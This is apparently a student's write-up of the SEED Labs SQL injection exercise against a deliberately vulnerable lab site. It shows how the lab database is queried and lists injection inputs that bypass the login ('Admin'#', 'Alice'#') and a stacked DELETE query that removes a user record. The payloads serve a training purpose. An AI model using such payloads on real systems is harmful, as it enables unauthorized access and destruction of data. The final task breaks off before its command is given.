# Seed-lab-SQL-injection

# Task 1
sudo mysql -u root -pseedubuntu

mysql> use Users;

mysql> show Tables;

mysql> select * from credential where Name = 'Alice';

![Task 1 Image](https://github.com/M-Kamran-Arshad/Seed-lab-SQL-injection/blob/main/task%201.png)

# task 2

# task 2.1

Username "Admin'#"
Password "abc" It will result in a SQL query as:

SELECT id, name, eid, salary, birth, ssn, address, email,

nickname, Password

FROM credential

WHERE name= 'Admin' #' and Password='abc'

Then statements after # will be regarded as comments. So we can log in as Admin.

![Task 2.1 Image](https://github.com/M-Kamran-Arshad/Seed-lab-SQL-injection/blob/main/task%202.1.png)

# task 2.2

![Task 2.2 Image](https://github.com/M-Kamran-Arshad/Seed-lab-SQL-injection/blob/main/task%202.2.png)

Now we use SQL query to update data using same vulnerability

'1=1; DELETE from credential where name='Alice';
So

USERNAME : '1=1; DELETE from credential where name='Alice';

PASSWORD : ""

As result


![Task 2.3 Image](https://github.com/M-Kamran-Arshad/Seed-lab-SQL-injection/blob/main/task%202.3.png)


#task 3

It's hard to find the navigation buttons on this website (www.SeedLabSQLInjection.com). In order to edit the profile, please log in and then jump to the link address: http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php by hand.

# Task 3.1

Log in with Alice's

USERNAME : "Alice'#"

PASSWORD : ""

# task 3.2

Log in with Boby

USERNAME : "Boby'#"

PASSWORD : ""

![Task 3.2 Image](https://github.com/M-Kamran-Arshad/Seed-lab-SQL-injection/blob/main/task%203.2.png)

# Task 3.3

The simplest approach is to log-in as Alice like Task 3.1 and change the password. Log in with Boby

USERNAME : "Alice'#"

PASSWORD : ""

Than enter http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php

Assume we want to change Alice's password as 12345. First, we should get SHA1 value of our new password via Terminal using Command

![Task 3.3 Image](https://github.com/M-Kamran-Arshad/Seed-lab-SQL-injection/blob/main/task%203.3.png)

